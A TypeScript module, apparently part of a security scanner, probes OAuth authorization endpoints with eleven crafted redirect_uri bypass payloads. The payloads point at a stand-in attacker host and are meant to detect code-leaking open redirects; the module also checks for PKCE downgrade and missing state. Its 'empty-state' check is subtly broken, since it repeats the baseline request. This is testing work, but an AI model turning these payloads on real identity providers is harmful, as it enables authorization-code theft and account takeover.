import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** OAuth / OIDC authorization-request tampering: redirect_uri parsing quirks
 *  that silently land the code at an attacker host (open redirect → account
 *  takeover when the flow auto-redirects), plus PKCE downgrade and missing
 *  state. Accepted = IdP itself 30x's to the evil URI without a consent step;
 *  a 200 that merely embeds the URI is reported weaker (needs one click). */

export interface OAuthInput {
  /** Authorization endpoint including static params; {REDIRECT} and {STATE} are substituted. */
  readonly authzUrl: string;
  /** The legitimate registered redirect (e.g. https://app.example.com/callback). */
  readonly redirect: string;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** Extra checks: PKCE downgrade + empty state (default true). */
  readonly pkce?: boolean;
}

export type OAuthVerdict = "accepted" | "consent-page" | "rejected" | "error";

export interface OAuthVector {
  readonly name: string;
  readonly redirectUri: string;
  readonly status: number;
  readonly locationHost: string;
  readonly verdict: OAuthVerdict;
  readonly evidence: string;
}

export interface OAuthAux {
  readonly name: string;
  readonly status: number;
  readonly locationHost: string;
  readonly note: string;
}

export interface OAuthResult {
  readonly honest: { redirect: string; host: string };
  readonly vectors: OAuthVector[];
  readonly aux: OAuthAux[];
  readonly takeoverRisk: boolean;
  readonly artifacts: { path: string; bytes: number }[];
}

const EVIL = "evil-velric.test";

const buildVectors = (legit: URL): { name: string; uri: string }[] => {
  const host = legit.host;
  const base = `${legit.protocol}//${host}`;
  const pathAndQuery = `${legit.pathname}${legit.search}`;
  return [
    { name: "subdomain-suffix", uri: `${base}.${EVIL}${pathAndQuery}` },
    { name: "userinfo-at", uri: `${legit.protocol}//${host}@${EVIL}${pathAndQuery}` },
    { name: "evil-prefix-path", uri: `https://${EVIL}${pathAndQuery}` },
    { name: "query-embed", uri: `https://${EVIL}/?next=${encodeURIComponent(legit.href)}` },
    { name: "fragment-at", uri: `https://${EVIL}/#@${host}${pathAndQuery}` },
    { name: "dot-segment", uri: `${base}/../${EVIL}${pathAndQuery}` },
    { name: "protocol-relative", uri: `//${EVIL}${pathAndQuery}` },
    { name: "scheme-downgrade", uri: `http://${host}${pathAndQuery}` },
    { name: "path-append", uri: `${legit.href}/${EVIL}` },
    { name: "encoded-slash", uri: `${legit.protocol}//${EVIL}%2f%2e%2e${pathAndQuery}` },
    { name: "javascript", uri: `javascript:alert(document.domain)` },
  ];
};

const locHost = (loc: string | undefined): string => {
  if (!loc) return "";
  try { return new URL(loc, "https://base.invalid").host; } catch { return loc.slice(0, 40); }
};

const submit = async (input: OAuthInput, redirectUri: string, extraParams: string): Promise<{ status: number; loc: string; body: string; headers: Record<string, string> }> => {
  const url = input.authzUrl
    .replaceAll("{REDIRECT}", encodeURIComponent(redirectUri))
    .replaceAll("{STATE}", "velric")
    .replaceAll("{EXTRA}", extraParams);
  const headers: Record<string, string> = { ...(input.headers ?? {}) };
  if (input.cookie) headers.cookie = input.cookie;
  const r = await fetchUrl(url, { headers, maxAttempts: 1, redirect: "manual", proxy: input.proxy, timeoutMs: input.timeoutMs ?? 10_000, maxBytes: 256 * 1024 });
  return { status: r.status, loc: r.headers.location ?? "", body: r.body, headers: r.headers };
};

export const probeOAuthBypass = async (input: OAuthInput): Promise<OAuthResult> => {
  const legit = new URL(input.redirect);
  // Baseline: the honest redirect must be accepted before quirks mean anything.
  const honest = await submit(input, input.redirect, "");
  const honestHost = locHost(honest.loc) || legit.host;
  const legitOk = honest.status >= 300 && honest.status < 400 && honestHost === legit.host;

  const vectors: OAuthVector[] = [];
  for (const v of buildVectors(legit)) {
    let r: { status: number; loc: string; body: string; headers: Record<string, string> };
    try { r = await submit(input, v.uri, ""); } catch (e) {
      vectors.push({ name: v.name, redirectUri: v.uri, status: 0, locationHost: "", verdict: "error", evidence: (e as Error).message.slice(0, 100) });
      continue;
    }
    const target = locHost(r.loc);
    const redirectsToEvil = target.includes(EVIL);
    const bodyMentionsEvil = r.body.includes(EVIL);
    let verdict: OAuthVerdict;
    let evidence: string;
    if (r.status >= 300 && r.status < 400 && redirectsToEvil) { verdict = "accepted"; evidence = `302 → ${r.loc.slice(0, 120)}`; }
    else if (r.status >= 200 && r.status < 300 && bodyMentionsEvil) { verdict = "consent-page"; evidence = "URI echoed in consent/error page — one click to land"; }
    else if (r.status === 0 || r.status >= 500) { verdict = "error"; evidence = `status ${r.status}`; }
    else if (r.status >= 300 && r.status < 400) { verdict = "rejected"; evidence = `→ ${r.loc.slice(0, 100) || "no location"}`; }
    else { verdict = "rejected"; evidence = `status ${r.status}, URI not echoed`; }
    vectors.push({ name: v.name, redirectUri: v.uri, status: r.status, locationHost: target || "-", verdict, evidence });
  }

  const aux: OAuthAux[] = [];
  if (input.pkce !== false) {
    const plain = await submit(input, input.redirect, "&code_challenge=velricchallenge12345678901234567890123&code_challenge_method=plain");
    aux.push({ name: "pkce-plain", status: plain.status, locationHost: locHost(plain.loc), note: plain.status < 400 ? "plain method accepted (S256 downgrade surface)" : "plain rejected" });
    const missing = await submit(input, input.redirect, "&code_challenge_method=S256");
    aux.push({ name: "pkce-no-challenge", status: missing.status, locationHost: locHost(missing.loc), note: missing.status < 400 ? "method without challenge tolerated" : "challenge required" });
    const noState = await submit(input, input.redirect, "");
    aux.push({ name: "empty-state", status: noState.status, locationHost: locHost(noState.loc), note: noState.status < 400 ? "empty state accepted → login-CSRF surface" : "state required" });
  }

  const autoAccepted = vectors.filter((v) => v.verdict === "accepted");
  const takeoverRisk = legitOk && autoAccepted.length > 0;
  const body = JSON.stringify({ authzUrl: input.authzUrl, honest: { redirect: input.redirect, host: honestHost, accepted: legitOk }, vectors, aux, takeoverRisk }, null, 2);
  const artifact = await writeArtifact(input.outputRoot, "oauth_bypass.json", body);
  return { honest: { redirect: input.redirect, host: honestHost }, vectors, aux, takeoverRisk, artifacts: [artifact] };
};
